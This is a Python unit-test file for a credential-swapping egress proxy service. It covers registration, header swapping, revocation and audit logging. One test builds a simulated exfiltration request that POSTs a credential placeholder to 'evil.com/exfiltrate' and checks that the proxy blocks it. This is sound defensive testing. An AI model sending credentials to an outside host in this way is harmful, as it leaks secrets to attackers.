"""Unit tests for SecretlessEgressProxyService."""

from __future__ import annotations

import pytest

from app.schemas.secretless_egress_proxy import (
    BoundCredentialRegisterRequest,
    InspectSwapRequest,
)
from app.services.security.secretless_egress_proxy_service import (
    SecretlessEgressProxyService,
)


@pytest.fixture
def service() -> SecretlessEgressProxyService:
    return SecretlessEgressProxyService()


def test_register_and_list_credentials(service: SecretlessEgressProxyService) -> None:
    req = BoundCredentialRegisterRequest(
        target_host="api.github.com",
        real_secret="ghp_super_secret_token_12345",
        auth_header_name="Authorization",
        auth_header_template="token {secret}",
    )
    resp = service.register_credential(req)

    assert resp.target_host == "api.github.com"
    assert resp.placeholder.startswith("myrm_cred_")
    assert resp.is_active is True

    creds = service.list_credentials()
    assert len(creds) == 1
    assert creds[0].target_host == "api.github.com"


def test_inspect_and_swap_authorized(service: SecretlessEgressProxyService) -> None:
    reg_req = BoundCredentialRegisterRequest(
        target_host="api.github.com",
        real_secret="ghp_super_secret_token_12345",
    )
    reg_resp = service.register_credential(reg_req)

    swap_req = InspectSwapRequest(
        target_host="api.github.com",
        path="/user",
        method="GET",
        headers={"Authorization": f"Bearer {reg_resp.placeholder}"},
    )
    result = service.inspect_and_swap(swap_req)

    assert result.is_allowed is True
    assert result.status_code == 200
    assert result.headers_to_inject["Authorization"] == "Bearer ghp_super_secret_token_12345"
    assert result.event is not None
    assert result.event.is_swapped is True
    assert result.event.is_blocked is False


def test_inspect_and_swap_cross_domain_blocked(service: SecretlessEgressProxyService) -> None:
    reg_req = BoundCredentialRegisterRequest(
        target_host="api.github.com",
        real_secret="ghp_super_secret_token_12345",
    )
    reg_resp = service.register_credential(reg_req)

    # Malicious attempt to leak placeholder to evil.com
    leak_req = InspectSwapRequest(
        target_host="evil.com",
        path="/exfiltrate",
        method="POST",
        headers={"Authorization": f"Bearer {reg_resp.placeholder}"},
    )
    result = service.inspect_and_swap(leak_req)

    assert result.is_allowed is False
    assert result.status_code == 403
    assert "Cross-domain exfiltration blocked" in (result.event.block_reason or "")


def test_revoke_credential(service: SecretlessEgressProxyService) -> None:
    reg_req = BoundCredentialRegisterRequest(
        target_host="api.github.com",
        real_secret="ghp_super_secret_token_12345",
    )
    reg_resp = service.register_credential(reg_req)

    revoke_resp = service.revoke_credential("api.github.com")
    assert revoke_resp.success is True

    assert len(service.list_credentials()) == 0

    # Request with revoked placeholder
    swap_req = InspectSwapRequest(
        target_host="api.github.com",
        path="/user",
        method="GET",
        headers={"Authorization": f"Bearer {reg_resp.placeholder}"},
    )
    result = service.inspect_and_swap(swap_req)
    assert result.is_allowed is False
    assert result.status_code == 403


def test_audit_events_history(service: SecretlessEgressProxyService) -> None:
    reg_req = BoundCredentialRegisterRequest(
        target_host="api.github.com",
        real_secret="ghp_super_secret_token_12345",
    )
    reg_resp = service.register_credential(reg_req)

    service.inspect_and_swap(
        InspectSwapRequest(
            target_host="api.github.com",
            path="/user",
            method="GET",
            headers={"Authorization": f"Bearer {reg_resp.placeholder}"},
        )
    )

    events = service.get_audit_events(limit=10)
    assert len(events) >= 1
    assert events[-1].target_host == "api.github.com"
